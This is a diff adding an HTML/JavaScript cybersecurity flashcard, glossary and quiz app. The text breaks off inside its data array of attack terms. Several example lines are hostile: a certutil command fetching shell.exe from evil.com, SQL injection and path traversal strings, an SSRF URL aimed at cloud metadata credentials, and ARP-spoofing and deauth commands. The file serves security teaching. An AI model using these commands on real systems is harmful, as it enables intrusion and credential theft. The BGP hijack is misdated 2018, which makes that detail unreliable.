@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberSec Field Manual</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');
+
+:root {
+  --bg: #060810;
+  --panel: #0a0e1a;
+  --border: #1a2a4a;
+  --accent: #00f5ff;
+  --accent2: #ff3366;
+  --accent3: #39ff14;
+  --text: #c8d8e8;
+  --dim: #4a6080;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Exo 2', sans-serif;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,245,255,0.012) 2px, rgba(0,245,255,0.012) 4px);
+  pointer-events: none;
+  z-index: 0;
+}
+
+header {
+  position: relative;
+  z-index: 10;
+  padding: 18px 28px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.logo {
+  font-family: 'Orbitron', monospace;
+  font-size: 18px;
+  font-weight: 900;
+  color: var(--accent);
+  text-shadow: 0 0 20px rgba(0,245,255,0.5);
+  letter-spacing: 3px;
+}
+.logo span { color: var(--accent2); }
+
+.status-bar {
+  margin-left: auto;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--dim);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.status-dot {
+  display: inline-block;
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: var(--accent3);
+  box-shadow: 0 0 8px var(--accent3);
+  animation: blink 2s infinite;
+}
+
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+.nav-tabs {
+  position: relative;
+  z-index: 10;
+  display: flex;
+  gap: 4px;
+  padding: 14px 28px 0;
+  border-bottom: 1px solid var(--border);
+}
+
+.tab {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  padding: 9px 18px;
+  border: 1px solid var(--border);
+  border-bottom: none;
+  background: transparent;
+  color: var(--dim);
+  cursor: pointer;
+  transition: all 0.2s;
+  text-transform: uppercase;
+  position: relative;
+  top: 1px;
+}
+.tab:hover { color: var(--accent); border-color: var(--accent); }
+.tab.active {
+  color: var(--accent);
+  border-color: var(--accent);
+  background: rgba(0,245,255,0.05);
+  box-shadow: 0 0 14px rgba(0,245,255,0.2);
+}
+
+.main {
+  position: relative;
+  z-index: 10;
+  padding: 28px;
+  max-width: 1000px;
+  margin: 0 auto;
+}
+
+.view { display: none; }
+.view.active { display: block; }
+
+/* ── FLASHCARD SECTION ── */
+.domain-filter {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-bottom: 24px;
+}
+
+.filter-btn {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  padding: 6px 14px;
+  border: 1px solid var(--border);
+  background: transparent;
+  color: var(--dim);
+  cursor: pointer;
+  transition: all 0.2s;
+  letter-spacing: 1px;
+}
+.filter-btn:hover { color: var(--text); border-color: var(--dim); }
+.filter-btn.active { color: var(--accent); border-color: var(--accent); background: rgba(0,245,255,0.07); }
+.filter-btn[data-domain="network"].active { color:#00bfff; border-color:#00bfff; background:rgba(0,191,255,0.07); }
+.filter-btn[data-domain="web"].active     { color:#ff9f43; border-color:#ff9f43; background:rgba(255,159,67,0.07); }
+.filter-btn[data-domain="ot"].active      { color:#39ff14; border-color:#39ff14; background:rgba(57,255,20,0.07); }
+.filter-btn[data-domain="malware"].active { color:#ff3366; border-color:#ff3366; background:rgba(255,51,102,0.07); }
+
+.card-arena {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 18px;
+}
+
+.card-counter {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px;
+  color: var(--dim);
+  letter-spacing: 2px;
+}
+
+.flashcard-wrap {
+  width: 100%;
+  max-width: 640px;
+  height: 300px;
+  perspective: 1200px;
+  cursor: pointer;
+}
+
+.flashcard {
+  width: 100%; height: 100%;
+  position: relative;
+  transform-style: preserve-3d;
+  transition: transform 0.55s ease;
+}
+.flashcard.flipped { transform: rotateY(180deg); }
+
+.card-face {
+  position: absolute;
+  inset: 0;
+  -webkit-backface-visibility: hidden;
+  backface-visibility: hidden;
+  border: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  padding: 28px;
+  text-align: center;
+  background: var(--panel);
+}
+
+.card-front {
+  border-color: var(--accent);
+  box-shadow: 0 0 18px rgba(0,245,255,0.2), inset 0 0 40px rgba(0,245,255,0.03);
+}
+
+.card-back {
+  -webkit-transform: rotateY(180deg);
+  transform: rotateY(180deg);
+  border-color: var(--accent2);
+  box-shadow: 0 0 18px rgba(255,51,102,0.2), inset 0 0 40px rgba(255,51,102,0.03);
+  align-items: flex-start;
+  text-align: left;
+}
+
+.card-domain-tag {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 3px;
+  padding: 3px 10px;
+  border: 1px solid;
+  margin-bottom: 16px;
+  text-transform: uppercase;
+}
+
+.card-term {
+  font-family: 'Orbitron', monospace;
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+
+.card-hint {
+  font-size: 12px;
+  color: var(--dim);
+  font-family: 'Share Tech Mono', monospace;
+  letter-spacing: 1px;
+}
+
+.card-back-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  color: var(--accent2);
+  letter-spacing: 3px;
+  margin-bottom: 12px;
+}
+
+.card-definition {
+  font-size: 13px;
+  line-height: 1.7;
+  color: var(--text);
+  margin-bottom: 12px;
+}
+
+.card-example {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--accent3);
+  line-height: 1.6;
+  padding: 8px 12px;
+  border-left: 2px solid var(--accent3);
+  background: rgba(57,255,20,0.04);
+}
+
+.flip-hint {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--dim);
+}
+
+.card-controls {
+  display: flex;
+  gap: 10px;
+}
+
+.ctrl-btn {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  padding: 9px 20px;
+  border: 1px solid;
+  background: transparent;
+  cursor: pointer;
+  transition: all 0.2s;
+  text-transform: uppercase;
+}
+.ctrl-btn.prev  { color: var(--dim); border-color: var(--border); }
+.ctrl-btn.prev:hover  { color: var(--text); border-color: var(--dim); }
+.ctrl-btn.next  { color: var(--accent); border-color: var(--accent); }
+.ctrl-btn.next:hover  { background: rgba(0,245,255,0.1); }
+.ctrl-btn.shuffle { color: var(--accent2); border-color: var(--accent2); }
+.ctrl-btn.shuffle:hover { background: rgba(255,51,102,0.1); }
+
+/* ── GLOSSARY ── */
+.search-bar {
+  width: 100%;
+  padding: 12px 16px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  color: var(--text);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px;
+  letter-spacing: 1px;
+  margin-bottom: 20px;
+  outline: none;
+  transition: border-color 0.2s;
+  -webkit-appearance: none;
+}
+.search-bar:focus { border-color: var(--accent); }
+.search-bar::placeholder { color: var(--dim); }
+
+.glossary-section { margin-bottom: 28px; }
+
+.section-header {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 4px;
+  padding: 7px 14px;
+  margin-bottom: 10px;
+  border-left: 3px solid;
+  text-transform: uppercase;
+}
+.section-header.network { color:#00bfff; border-color:#00bfff; background:rgba(0,191,255,0.05); }
+.section-header.web     { color:#ff9f43; border-color:#ff9f43; background:rgba(255,159,67,0.05); }
+.section-header.ot      { color:#39ff14; border-color:#39ff14; background:rgba(57,255,20,0.05); }
+.section-header.malware { color:#ff3366; border-color:#ff3366; background:rgba(255,51,102,0.05); }
+
+.glossary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 8px;
+}
+
+.glossary-item {
+  border: 1px solid var(--border);
+  padding: 12px 14px;
+  background: var(--panel);
+  transition: border-color 0.2s;
+}
+.glossary-item:hover { border-color: var(--dim); }
+
+.g-term {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px;
+  font-weight: 700;
+  margin-bottom: 5px;
+  letter-spacing: 1px;
+}
+.g-term.network { color:#00bfff; }
+.g-term.web     { color:#ff9f43; }
+.g-term.ot      { color:#39ff14; }
+.g-term.malware { color:#ff3366; }
+
+.g-def { font-size: 12px; color: var(--text); line-height: 1.6; }
+.g-example { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); margin-top: 5px; line-height: 1.5; }
+
+/* ── QUIZ ── */
+.quiz-container { max-width: 600px; margin: 0 auto; }
+
+.quiz-meta {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.quiz-score-display {
+  font-family: 'Orbitron', monospace;
+  font-size: 11px;
+  color: var(--accent3);
+  letter-spacing: 2px;
+}
+
+.quiz-progress-text {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--dim);
+  letter-spacing: 1px;
+}
+
+.progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--border);
+  margin-bottom: 22px;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  transition: width 0.4s ease;
+  box-shadow: 0 0 8px var(--accent);
+}
+
+.quiz-question-box {
+  border: 1px solid var(--accent);
+  padding: 24px 28px;
+  background: var(--panel);
+  box-shadow: 0 0 16px rgba(0,245,255,0.15);
+  margin-bottom: 16px;
+}
+
+.quiz-q-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  color: var(--dim);
+  letter-spacing: 3px;
+  margin-bottom: 12px;
+}
+
+.quiz-question {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--text);
+  line-height: 1.6;
+}
+
+.quiz-options {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  margin-bottom: 16px;
+}
+
+.quiz-option {
+  border: 1px solid var(--border);
+  padding: 12px 16px;
+  background: var(--panel);
+  color: var(--text);
+  cursor: pointer;
+  font-family: 'Exo 2', sans-serif;
+  font-size: 13px;
+  text-align: left;
+  transition: all 0.2s;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  width: 100%;
+  -webkit-appearance: none;
+}
+.quiz-option:hover:not([disabled]) {
+  border-color: var(--accent);
+  background: rgba(0,245,255,0.05);
+}
+.quiz-option.correct {
+  border-color: var(--accent3);
+  background: rgba(57,255,20,0.08);
+  color: var(--accent3);
+}
+.quiz-option.wrong {
+  border-color: var(--accent2);
+  background: rgba(255,51,102,0.08);
+  color: var(--accent2);
+}
+
+.opt-letter {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  width: 22px;
+  height: 22px;
+  border: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.quiz-feedback {
+  padding: 12px 16px;
+  border: 1px solid;
+  font-size: 13px;
+  line-height: 1.5;
+  margin-bottom: 14px;
+  display: none;
+  font-family: 'Share Tech Mono', monospace;
+}
+.quiz-feedback.correct { border-color: var(--accent3); color: var(--accent3); background: rgba(57,255,20,0.05); }
+.quiz-feedback.wrong   { border-color: var(--accent2); color: var(--accent2); background: rgba(255,51,102,0.05); }
+
+.quiz-next-btn {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 3px;
+  padding: 11px 26px;
+  border: 1px solid var(--accent);
+  background: rgba(0,245,255,0.08);
+  color: var(--accent);
+  cursor: pointer;
+  text-transform: uppercase;
+  transition: all 0.2s;
+  display: none;
+}
+.quiz-next-btn:hover { background: rgba(0,245,255,0.15); }
+
+.quiz-result {
+  text-align: center;
+  padding: 48px 20px;
+  display: none;
+}
+
+.result-score {
+  font-family: 'Orbitron', monospace;
+  font-size: 64px;
+  font-weight: 900;
+  color: var(--accent);
+  text-shadow: 0 0 30px rgba(0,245,255,0.5);
+  line-height: 1;
+  margin-bottom: 8px;
+}
+
+.result-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px;
+  color: var(--dim);
+  letter-spacing: 3px;
+  margin-bottom: 24px;
+}
+
+.result-grade {
+  font-family: 'Orbitron', monospace;
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 28px;
+  letter-spacing: 2px;
+}
+
+.restart-btn {
+  font-family: 'Orbitron', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 3px;
+  padding: 12px 30px;
+  border: 1px solid var(--accent);
+  background: transparent;
+  color: var(--accent);
+  cursor: pointer;
+  text-transform: uppercase;
+  transition: all 0.2s;
+}
+.restart-btn:hover { background: rgba(0,245,255,0.1); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">CYBER<span>SEC</span> FIELD MANUAL</div>
+  <div class="status-bar">
+    <span class="status-dot"></span>
+    <span id="total-label">LOADING...</span>
+  </div>
+</header>
+
+<nav class="nav-tabs">
+  <button class="tab active" id="tab-flashcards">FLASHCARDS</button>
+  <button class="tab" id="tab-glossary">GLOSSARY</button>
+  <button class="tab" id="tab-quiz">QUIZ MODE</button>
+</nav>
+
+<main class="main">
+
+  <!-- FLASHCARD VIEW -->
+  <div id="view-flashcards" class="view active">
+    <div class="domain-filter">
+      <button class="filter-btn active" data-domain="all">ALL DOMAINS</button>
+      <button class="filter-btn" data-domain="network">NETWORK</button>
+      <button class="filter-btn" data-domain="web">WEB / APP</button>
+      <button class="filter-btn" data-domain="ot">OT / ICS</button>
+      <button class="filter-btn" data-domain="malware">MALWARE</button>
+    </div>
+    <div class="card-arena">
+      <div class="card-counter" id="card-counter">01 / --</div>
+      <div class="flashcard-wrap" id="flashcard-wrap">
+        <div class="flashcard" id="flashcard">
+          <div class="card-face card-front">
+            <div class="card-domain-tag" id="card-domain-tag"></div>
+            <div class="card-term" id="card-term">LOADING...</div>
+            <div class="card-hint" id="card-hint"></div>
+          </div>
+          <div class="card-face card-back">
+            <div class="card-back-label">// DEFINITION</div>
+            <div class="card-definition" id="card-definition"></div>
+            <div class="card-example" id="card-example"></div>
+          </div>
+        </div>
+      </div>
+      <div class="flip-hint">[ CLICK CARD TO FLIP ]</div>
+      <div class="card-controls">
+        <button class="ctrl-btn prev" id="btn-prev">◀ PREV</button>
+        <button class="ctrl-btn shuffle" id="btn-shuffle">⟳ SHUFFLE</button>
+        <button class="ctrl-btn next" id="btn-next">NEXT ▶</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- GLOSSARY VIEW -->
+  <div id="view-glossary" class="view">
+    <input class="search-bar" type="text" id="glossary-search" placeholder="// SEARCH TERMS AND DEFINITIONS...">
+    <div id="glossary-content"></div>
+  </div>
+
+  <!-- QUIZ VIEW -->
+  <div id="view-quiz" class="view">
+    <div class="quiz-container">
+      <div class="quiz-meta">
+        <div class="quiz-score-display" id="quiz-score-display">SCORE: 0 / 0</div>
+        <div class="quiz-progress-text" id="quiz-progress-text">0 / 10</div>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="quiz-progress-fill" style="width:0%"></div>
+      </div>
+      <div id="quiz-active">
+        <div class="quiz-question-box">
+          <div class="quiz-q-label">// IDENTIFY THE TERM</div>
+          <div class="quiz-question" id="quiz-question">-</div>
+        </div>
+        <div class="quiz-options" id="quiz-options"></div>
+        <div class="quiz-feedback" id="quiz-feedback"></div>
+        <button class="quiz-next-btn" id="quiz-next-btn">NEXT QUESTION ▶</button>
+      </div>
+      <div class="quiz-result" id="quiz-result">
+        <div class="result-score" id="result-score">0%</div>
+        <div class="result-label">ACCURACY RATING</div>
+        <div class="result-grade" id="result-grade"></div>
+        <button class="restart-btn" id="restart-btn">RESTART QUIZ</button>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<script>
+// ── DATA ──────────────────────────────────────────────────────────────────────
+var TERMS = [
+  {domain:'network',term:'Passive Recon',hint:'No packets touch the target',definition:'Gathering info about a target without sending any traffic to it. Uses OSINT, Shodan, DNS records, WHOIS lookups, and certificate transparency logs. Leaves zero traces in target logs.',example:'e.g. Shodan search reveals open ports without alerting the target'},
+  {domain:'network',term:'Active Recon',hint:'You are now visible in logs',definition:'Directly probing a target with packets to discover open ports, services, and OS info. Tools include Nmap and banner grabbing. Leaves footprints in target logs.',example:'e.g. nmap -sV -O 192.168.1.1 — scans services and OS fingerprint'},
+  {domain:'network',term:'MitM Attack',hint:'Attacker sits between two parties',definition:'Man-in-the-Middle: attacker secretly intercepts communication between two parties, reading or modifying traffic. Common delivery: ARP spoofing, rogue APs, or SSL stripping.',example:'e.g. Attacker on same WiFi intercepts bank login via ARP spoofing'},
+  {domain:'network',term:'ARP Spoofing',hint:'Poisons the local ARP cache',definition:'Sends fake ARP replies to link the attacker MAC address with a legitimate IP. Traffic on the local network gets redirected through the attacker machine. Works only on local networks.',example:'e.g. arpspoof -i eth0 -t 192.168.1.5 192.168.1.1'},
+  {domain:'network',term:'DNS Spoofing',hint:'Redirect victims via corrupt DNS',definition:'Injects malicious DNS records to redirect users to attacker-controlled IPs. Victims type the right URL but land on a fake site. Can happen via cache poisoning or rogue DNS servers.',example:'e.g. User types bank.com, DNS returns 10.0.0.99 — the attacker clone'},
+  {domain:'network',term:'SSL Stripping',hint:'HTTPS silently downgraded to HTTP',definition:'MitM attack that downgrades a secure HTTPS connection to plain HTTP. The attacker proxies both sides. Victim sees no warning. Defeated by HSTS headers.',example:'e.g. Victim believes they are secure — attacker reads plaintext passwords'},
+  {domain:'network',term:'BGP Hijacking',hint:'Reroute internet traffic at routing level',definition:'Malicious actors announce false BGP routes, convincing routers to forward traffic through them. Can redirect massive traffic volumes. A nation-state level capability.',example:'e.g. 2018: Pakistan Telecom accidentally hijacked YouTube routes globally'},
+  {domain:'network',term:'SYN Flood',hint:'Exploits TCP three-way handshake',definition:'Floods a server with SYN packets but never completes the handshake. Server holds open connections for each SYN until resources are exhausted. Classic DoS vector.',example:'e.g. Server waits for ACKs that never arrive — real users get connection refused'},
+  {domain:'network',term:'DDoS Amplification',hint:'Small request causes massive response',definition:'Attacker spoofs the victim IP and sends small requests to servers that reply with far larger packets. Those large replies flood the victim. DNS and NTP can amplify 10,000x or more.',example:'e.g. 1 byte DNS query triggers 3,000 byte response — all sent to victim'},
+  {domain:'network',term:'Pass the Hash',hint:'Reuse NTLM hash without cracking it',definition:'Capture an NTLM password hash from memory using a tool like Mimikatz, then authenticate with that hash directly — no need to crack it first. A Windows-specific lateral movement technique.',example:'e.g. mimikatz dumps hashes from LSASS memory — used to log into other Windows hosts'},
+  {domain:'network',term:'Golden Ticket',hint:'Forge Kerberos tickets for any account',definition:'After extracting the KRBTGT hash from a domain controller, an attacker can forge Kerberos TGTs for any user including domain admins. Tickets can be set to never expire.',example:'e.g. Attacker forges a domain admin ticket lasting 10 years — survives password resets'},
+  {domain:'network',term:'Evil Twin AP',hint:'Rogue WiFi clone of the real AP',definition:'A rogue access point mimicking a legitimate WiFi network, usually with a stronger signal. Victims connect thinking it is real. Attacker intercepts all traffic as a MitM.',example:'e.g. Fake Starbucks_WiFi with higher signal — victim traffic fully intercepted'},
+  {domain:'network',term:'Deauth Attack',hint:'802.11 management frames are unauthenticated',definition:'Sends spoofed 802.11 deauthentication frames to forcibly kick clients off an AP. Then waits to capture the WPA handshake when they reconnect, for offline brute-force.',example:'e.g. aireplay-ng --deauth 10 kicks clients, capture the 4-way handshake'},
+  {domain:'network',term:'Pivoting',hint:'Use compromised host as jump point',definition:'After compromising one host, use it as a launch point to reach deeper internal systems that were not accessible from outside the network. Core lateral movement technique.',example:'e.g. Compromise web server, SSH tunnel through it, attack internal DB server'},
+  {domain:'web',term:'SQL Injection',hint:'Malicious SQL code sent via input fields',definition:'Unsanitized user input is passed directly into a SQL query and executed by the database. Can dump entire tables, bypass authentication, or delete data. Union-based, blind, and time-based variants exist.',example:"e.g. Login input: ' OR '1'='1 — makes the WHERE clause always true, bypasses auth"},
+  {domain:'web',term:'XSS',hint:'Scripts injected and run in other browsers',definition:'Cross-Site Scripting: inject malicious JavaScript into pages viewed by other users. Reflected (in the URL), Stored (saved in DB, hits every visitor), or DOM-based (client-side only).',example:'e.g. Stored script in a comment field sends every visitor\'s cookies to attacker'},
+  {domain:'web',term:'CSRF',hint:'Tricks logged-in browser into unwanted requests',definition:'Cross-Site Request Forgery: a malicious page tricks an authenticated user browser into making requests to another site where they are logged in. Mitigated by CSRF tokens and SameSite cookies.',example:'e.g. Victim visits evil.com — it silently POSTs to bank.com/transfer?to=attacker'},
+  {domain:'web',term:'SSRF',hint:'Make the server fetch attacker-specified URLs',definition:'Server-Side Request Forgery: force the server to issue HTTP requests to arbitrary URLs. Dangerous in cloud: hitting the metadata IP 169.254.169.254 can leak IAM credentials.',example:'e.g. image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
+  {domain:'web',term:'IDOR',hint:'Swap ID 123 for 124 to access another record',definition:'Insecure Direct Object Reference: the server does not enforce access controls on resource identifiers. Users can access objects belonging to others by guessing or incrementing IDs.',example:'e.g. /api/invoice/1042 changed to /api/invoice/1043 returns another user record'},
+  {domain:'web',term:'XXE',hint:'Malicious XML tricks parser into reading local files',definition:'XML External Entity injection: crafted XML referencing external entities can read local server files, trigger SSRF, or cause DoS. Requires a misconfigured XML parser.',example:'e.g. ENTITY declaration referencing file:///etc/passwd returns the file in the response'},
+  {domain:'web',term:'SSTI',hint:'Input executed inside a template engine',definition:'Server-Side Template Injection: attacker-controlled input is processed and executed by a template engine like Jinja2 or Twig. Can escalate to full Remote Code Execution.',example:'e.g. Submitting {{7*7}} renders as 49 — confirms injection, then escalate to RCE'},
+  {domain:'web',term:'Insecure Deserialization',hint:'Malicious objects trigger code on deserialization',definition:'Deserializing untrusted attacker-controlled data can trigger arbitrary code execution. Affects Java, PHP unserialize, Python pickle, and .NET BinaryFormatter.',example:'e.g. Tampered Java serialized object triggers Runtime.exec when the server deserializes it'},
+  {domain:'web',term:'JWT Attack',hint:'Exploit weaknesses in JSON Web Tokens',definition:'JWT vulnerabilities include: alg:none bypass (strip the signature), weak HMAC secret brute-force, and algorithm confusion where RS256 is downgraded to HS256 using the public key.',example:'e.g. Change alg from RS256 to HS256, sign with the public key — server accepts it as valid'},
+  {domain:'web',term:'Path Traversal',hint:'Use ../ sequences to escape the allowed directory',definition:'Manipulating file path inputs with ../ sequences to access files outside the intended directory. Classic targets are /etc/passwd on Linux and win.ini on Windows.',example:'e.g. /download?file=../../../../etc/passwd returns the system password file'},
+  {domain:'web',term:'Request Smuggling',hint:'Frontend and backend disagree on request boundaries',definition:'Exploits a parsing discrepancy between a front-end proxy and back-end server over Content-Length vs Transfer-Encoding. Allows attacker to smuggle a hidden second request.',example:'e.g. Poison the back-end queue to prepend data to another user\'s next request'},
+  {domain:'web',term:'Subdomain Takeover',hint:'DNS still points to a deprovisioned resource',definition:'A DNS record points to a cloud service (S3, Heroku, GitHub Pages) that the organization no longer uses. Attacker claims that resource and serves arbitrary content under the victim domain.',example:'e.g. blog.victim.com still points to an old Heroku app — attacker claims the dyno'},
+  {domain:'ot',term:'SCADA',hint:'Supervisory Control and Data Acquisition',definition:'Industrial system for monitoring and controlling distributed physical infrastructure such as power grids, water treatment plants, and oil pipelines. Collects sensor data and sends remote control commands.',example:'e.g. Ukraine 2015: SCADA systems manipulated to cause real power grid blackouts'},
+  {domain:'ot',term:'PLC',hint:'Programmable Logic Controller',definition:'Ruggedized computer that controls physical machinery in real time. Reads sensor inputs, runs ladder logic programs, and sends control signals to actuators like valves and motors.',example:'e.g. Stuxnet reprogrammed Siemens S7 PLCs to destroy Iranian centrifuges'},
+  {domain:'ot',term:'Purdue Model',hint:'OT network layered from field to enterprise',definition:'Reference architecture for ICS networks. Level 0 is the physical process, L1 are PLCs, L2 is SCADA and DCS, L3 is site operations, and L4/5 is the enterprise IT network.',example:'e.g. The firewall between L3 and L4 is the IT/OT boundary most attackers try to cross'},
+  {domain:'ot',term:'Modbus',hint:'1979 protocol with no authentication at all',definition:'Serial communication protocol created in 1979 and still dominant in industrial environments. Has no authentication, no encryption, and no integrity checking. Any device on the network can issue commands.',example:'e.g. Any host on the Modbus network can write arbitrary values directly to PLC registers'},
+  {domain:'ot',term:'Air Gap',hint:'Physical separation — often a myth in practice',definition:'Physical isolation of an OT network from the internet and IT networks. In theory it prevents remote attacks. In practice, USB drives, vendor laptops, and cellular modems constantly breach it.',example:'e.g. Stuxnet spread via infected USB drives into an air-gapped Iranian nuclear facility'},
+  {domain:'ot',term:'Data Diode',hint:'Hardware-enforced one-way communication',definition:'A hardware device that physically enforces one-direction data flow from OT to IT. Data can go out but nothing can come back in. The strongest practical OT isolation method.',example:'e.g. Historian pushes process data to IT analytics — IT literally cannot send anything back'},
+  {domain:'ot',term:'False Data Injection',hint:'Feed bad sensor readings to fool operators',definition:'Attacker manipulates sensor values reported to SCADA or HMI displays. Operators and automated control systems make decisions based on the false readings, which can create unsafe physical conditions.',example:'e.g. Display normal pressure readings while actual pressure approaches a dangerous level'},
+  {domain:'ot',term:'Stuxnet',hint:'First known cyber-physical weapon — 2010',definition:'Nation-state malware targeting Siemens S7 PLCs controlling Iranian uranium centrifuges. Made them spin at destructive speeds while reporting normal operation. Used four zero-day exploits.',example:'e.g. Spread via USB, undetected for about two years, physically destroyed around 1000 centrifuges'},
+  {domain:'ot',term:'Triton Malware',hint:'Disabled safety systems to allow catastrophe',definition:'Malware targeting Schneider Electric Safety Instrumented Systems. Designed to disable emergency shutdown systems so a concurrent attack could cause a physical explosion without safety systems intervening.',example:'e.g. 2017 Saudi petrochemical plant: the safety system triggered a safe shutdown and foiled the attack'},
+  {domain:'ot',term:'HMI Attack',hint:'Old Windows running critical infrastructure',definition:'Human Machine Interfaces — the operator consoles for SCADA systems — typically run unpatched Windows with default credentials, exposed RDP, and no endpoint detection.',example:'e.g. Oldsmar 2021: attacker accessed water plant HMI via TeamViewer, raised chemical to dangerous level'},
+  {domain:'malware',term:'RAT',hint:'Remote Access Trojan — full persistent control',definition:'Remote Access Trojan gives an attacker full control of the victim machine: keylogging, screenshots, file access, and webcam. Typically delivered via phishing and hides from the process list.',example:'e.g. AsyncRAT and njRAT are common RATs used in targeted attacks against organizations'},
+  {domain:'malware',term:'Rootkit',hint:'Hides at OS or firmware level',definition:'Malware that conceals itself and other malicious code from the operating system and security tools. Kernel rootkits patch the OS itself. Bootkits persist below the OS in firmware.',example:'e.g. Azazel hooks libc to hide malicious processes from the output of ps and ls'},
+  {domain:'malware',term:'Fileless Malware',hint:'Lives in memory — nothing on disk',definition:'Executes entirely in RAM using legitimate built-in system tools like PowerShell, WMI, and certutil. Nothing is written to disk so traditional signature-based AV finds nothing to scan.',example:'e.g. PowerShell downloads and executes shellcode directly in memory — no EXE ever written'},
+  {domain:'malware',term:'Ransomware',hint:'Encrypt files, demand payment',definition:'Encrypts victim files and demands a ransom for the decryption key. Modern variants use double extortion — exfiltrate data first, then encrypt. Triple extortion adds DDoS threats.',example:'e.g. Colonial Pipeline 2021: 4.4M paid to DarkSide, pipeline shut down for five days'},
+  {domain:'malware',term:'Buffer Overflow',hint:'Write past buffer boundary to overwrite memory',definition:'Writing more data than a buffer can hold overflows into adjacent memory such as return addresses or function pointers. The attacker redirects code execution to shellcode. Stack and heap variants exist.',example:'e.g. Overwriting the saved return address on the stack to point to attacker shellcode'},
+  {domain:'malware',term:'ROP Chains',hint:'Chain gadgets to bypass DEP and NX',definition:'Return-Oriented Programming: chain together small existing code sequences called gadgets, each ending in a RET instruction, to build arbitrary behavior without injecting new code. Bypasses DEP and NX.',example:'e.g. Chaining libc gadgets to call system("/bin/sh") with no shellcode injection needed'},
+  {domain:'malware',term:'Use-After-Free',hint:'Access memory after it has been freed',definition:'A bug where code accesses a memory region after it has been freed. The attacker arranges for controlled data to occupy that freed region before the access happens, leading to code execution.',example:'e.g. Browser UAF bugs are among the most common exploit primitives in Chrome CVEs'},
+  {domain:'malware',term:'Supply Chain Attack',hint:'Compromise the software before it ships',definition:'Compromise a trusted software vendor, build pipeline, or open-source dependency so malware is distributed to all downstream customers. Effective because the malicious update comes from a trusted source.',example:'e.g. SolarWinds 2020: malicious update shipped to 18000 organizations including US agencies'},
+  {domain:'malware',term:'Living off the Land',hint:'Use built-in OS tools to avoid detection',definition:'Use pre-installed legitimate OS utilities as attack tools — PowerShell, certutil, mshta, wmic, regsvr32. No custom binary is dropped, so there is no signature for AV to detect.',example:'e.g. certutil.exe -urlcache -split -f http://evil.com/shell.exe shell.exe'},
+  {domain:'malware',term:'Phishing',hint:'Email-based social engineering attack',definition:'Fraudulent emails impersonating trusted entities to steal credentials or deliver malware. Spearphishing is targeted at specific individuals. Whaling targets executives. Smishing uses SMS instead.',example:'e.g. Your account will be suspended — link leads to a credential harvesting clone page'},
+  {domain:'malware',term:'Watering Hole',hint:'Compromise a site the target already visits',definition:'Instead of attacking the target directly, the attacker compromises a website the target regularly visits. Passive and patient — wait for the target to come to you. Used against high-value targets.',example:'e.g. Compromise an industry forum frequented by defense contractors'},
+  {domain:'malware',term:'DLL Hijacking',hint:'Drop malicious DLL where the app loads it first',definition:'Place a malicious DLL in a directory that a legitimate application searches before the real system location. The app loads the attacker code with its own elevated privileges.',example:'e.g. Drop a fake version.dll next to a Windows app — it loads before the real one in System32'},
